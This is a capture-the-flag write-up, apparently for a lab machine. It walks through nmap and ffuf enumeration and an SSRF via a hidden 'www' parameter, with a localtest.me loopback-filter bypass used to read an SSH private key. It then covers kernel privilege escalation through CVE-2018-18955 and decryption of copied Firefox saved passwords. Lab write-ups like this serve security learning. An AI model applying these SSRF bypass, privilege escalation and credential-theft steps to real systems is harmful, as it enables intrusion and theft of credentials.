# 1. Initial Scanning

## 1.1 TCP Scan

**Top 1000 Ports Scan**

> **Command**
```bash
nmap -sC -sV 10.49.136.26
```

> **Output**
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-title: Explore London
|_http-server-header: gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!NOTE]
> * **Port 22:** OpenSSH 7.6p1 Ubuntu
> * **Port 8080:** HTTP Gunicorn server

**Full Port Scan**

> **Command**
```bash
nmap -p- --min-rate=1000 10.49.136.26
```

> **Output**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

> [!NOTE]
> The full scan did not identify any additional listening ports.

## 1.2 UDP Scan

> **Command**
```bash
sudo nmap -sU --top-ports 100 10.49.136.26
```

> **Output**
```text
PORT    STATE          SERVICE
68/udp  open|filtered  dhcpc
```

> [!NOTE]
> The scan only found port **68/udp (DHCPC)** open, which is standard infrastructure and likely irrelevant to this challenge.

---

# 2. Service Enumeration

## 2.1 HTTP Server (Port 8080)

### 2.1.1 Manual Exploration

Manually exploring the web application revealed a simple index page with links to `/contact` and `/gallery`.
* **`/gallery`:** Contains a form to upload files to `/upload` and displays images from that directory. This suggests a potential Local File Inclusion (LFI) or Arbitrary File Upload vulnerability.
* **`/contact`:** Contains a feedback form that POSTs data to the `/feedback` endpoint.

> [!TIP]
> Inspecting the source code of `/gallery` revealed a comment:
> `<!--To devs: Make sure that people can also add images using links-->`

### 2.1.2 Directory Fuzzing

**Wordlist: common.txt**

> **Command**
```bash
gobuster dir -u [http://10.49.136.26:8080](http://10.49.136.26:8080) -w /usr/share/wordlists/dirb/common.txt -t 70 -x php,txt,html,db,zip
```

> **Output**
```text
contact              (Status: 200) [Size: 1703]
feedback             (Status: 405) [Size: 178]
gallery              (Status: 200) [Size: 1722]
upload               (Status: 405) [Size: 178]
```

> [!NOTE]
> The scan confirmed the standard endpoints found during manual exploration (`/contact`, `/gallery`) and identified the backend processing endpoints (`/feedback`, `/upload`), which returned **405 Method Not Allowed** when accessed directly via GET.

**Wordlist: directory-list-lowercase-2.3-medium.txt**

> **Command**
```bash
gobuster dir -u [http://10.49.136.26:8080](http://10.49.136.26:8080) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 70 -x php,txt,html
```

> **Output**
```text
contact              (Status: 200) [Size: 1703]
feedback             (Status: 405) [Size: 178]
gallery              (Status: 200) [Size: 1820]
upload               (Status: 405) [Size: 178]
dejaview             (Status: 200) [Size: 823]
```

> [!IMPORTANT]
> This scan discovered `/dejaview`. Accessing this endpoint redirects to `/view_image`, a feature allowing users to view pictures via a URL parameter.

---

# 3. Vulnerability Assessment

## 3.1 SSRF in `/view_image`

After unsuccessfully attempting File Upload, standard SSRF, and XSS attacks against the known endpoints, I recalled the hint hidden in the `/gallery` source code regarding "adding images using links." This led me to fuzz for hidden POST parameters on the newly discovered `/view_image` endpoint.

I analyzed the request structure in BurpSuite to prepare the FFUF command. Initially, I used the `burp-parameter-names.txt` wordlist with no results. Switching to `directory-list-lowercase-2.3-small.txt` yielded a hit.

> **Command**
```bash
ffuf -u '[http://10.49.136.26:8080/view_image](http://10.49.136.26:8080/view_image)' \
     -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -X POST -d 'FUZZ=test' -fs 823
```

> **Output**
```text
www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 120ms]
```

> [!IMPORTANT]
> The server responds to the parameter: **www**

### Bypassing SSRF Filters

Using the `www` parameter, I confirmed the server would fetch file contents from a supplied URL.
1.  **SSTI Check:** Payloads like `{{7*7}}` returned plain text, ruling out template injection.
2.  **Internal Network Mapping:** I attempted to reach the loopback address. Direct attempts using `http://127.0.0.1`, `http://0.0.0.0`, and `http://localhost` were blocked by a filter.
3.  **The Bypass:** I successfully bypassed the filter using `http://localtest.me` (a domain that resolves to 127.0.0.1 via DNS, bypassing string matching filters).

With the bypass in place, I used FFUF to scan the internal network ports:

> **Command**
```bash
seq 1 65535 | ffuf -u [http://10.49.138.168:8080/view_image](http://10.49.138.168:8080/view_image) \
     -X POST \
     -d "www=[http://localtest.me](http://localtest.me):FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
     -H "Referer: [http://10.49.138.168:8080/dejaview](http://10.49.138.168:8080/dejaview)" \
     -H "Origin: [http://10.49.138.168:8080](http://10.49.138.168:8080)" \
     -w - \
     -fs 290  
```

> **Output**
```text
80                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 168ms]
8080                    [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 173ms]
```

> [!IMPORTANT]
> A second HTTP server was found running on **internal port 80**. Manual verification showed a different index page (mentioning a "broken bridge"), confirming we had pivoted successfully.

### Retrieving Credentials

Knowing the application used Gunicorn, I attempted to read the source code. I successfully retrieved `app.py`, but it revealed no credentials. I then performed a directory scan on the internal port 80 using the SSRF vulnerability.

> **Command**
```bash
ffuf -u [http://10.49.138.168:8080/view_image](http://10.49.138.168:8080/view_image) \
     -X POST \
     -d "www=[http://localtest.me:80/FUZZ](http://localtest.me:80/FUZZ)" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
     -H "Referer: [http://10.49.138.168:8080/dejaview](http://10.49.138.168:8080/dejaview)" \
     -H "Origin: [http://10.49.138.168:8080](http://10.49.138.168:8080)" \
     -w /usr/share/wordlists/dirb/common.txt \
     -fs 469 \
     -t 5 \
     -p 0.1 \
     -ic
```

> **Output**
```text
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 120ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 122ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 126ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 116ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 119ms]
index.html              [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 123ms]
...
```

> [!IMPORTANT]
> The scan revealed a `/.ssh` directory containing `authorized_keys` and, critically, the **private key** `id_rsa`. This granted SSH access as the user `beth@london`.

---

# 4. Privilege Escalation

## 4.1 Vertical Escalation (To Root)

After gaining access as `beth`, I searched for the **user flag**. It was not in the standard location, so I used `grep` to search for the standard flag format:

> **Command**
```bash
grep -r "THM" /home/beth/
```

This located the flag inside `/home/beth/__pycache__/user.txt`.

**Enumeration:**
Standard enumeration (sudo rights, SUID binaries, cron jobs) yielded no vectors. Checking the kernel version with `uname -a` revealed the server was running an outdated kernel: **4.15**.

> **Command**
```bash
searchsploit linux kernel 4.15
```

> **Output**
```text
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cr | linux/local/47164.sh)
```

> [!IMPORTANT]
> I identified several exploits for **CVE-2018-18955**. The first attempt using the cron method failed. However, the [exploit 47165](https://www.exploit-db.com/exploits/47165) (using nested user namespaces) worked successfully, upgrading the shell to root. 
>
> Inside the root directory, I found `flag.py`, which contained the **root flag** encoded in Base64.

## 4.2 Decrypting Charles' Password

The final task was to recover the password for the user Charles.

1.  **Shadow File Analysis:** The `/etc/shadow` file showed Charles' hash starting with `$6$`, indicating SHA-512 crypt. This is computationally expensive to brute-force.
2.  **Firefox Profile:** Checking `/home/Charles`, I discovered a `.mozilla` directory. This is a common location for saved credentials.
3.  **Exfiltration:** I located the profile folder containing:
    * `logins.json` (Encrypted credentials)
    * `key4.db` (Decryption key database)
4.  **Decryption:** I transferred both files to my attack machine and used the tool [firepwd.py](https://github.com/lclevy/firepwd/blob/master/firepwd.py)

> **Command**
```bash
python firepwd.py
```

The script successfully decrypted the data, revealing Charles' plaintext password.
